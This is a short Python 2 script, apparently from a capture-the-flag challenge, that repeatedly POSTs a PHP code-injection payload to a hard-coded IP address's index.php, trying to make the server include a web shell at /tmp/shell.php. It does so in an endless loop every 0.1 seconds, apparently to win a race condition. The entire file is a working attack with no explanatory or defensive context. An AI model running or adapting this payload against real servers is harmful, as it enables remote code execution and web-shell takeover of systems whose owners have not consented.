import urllib
import urllib2
import time
data={'c':'var_dump(include("/tmp/shell.php"));'}
data_urlencode = urllib.urlencode(data)
requrl = "http://42.194.147.119:20334/index.php"
req = urllib2.Request(url = requrl,data = data_urlencode)
'''
res_data = urllib2.urlopen(req)
res = res_data.read()
print res[:418]
'''
while 1:
    res_data = urllib2.urlopen(req)
    time.sleep(0.1)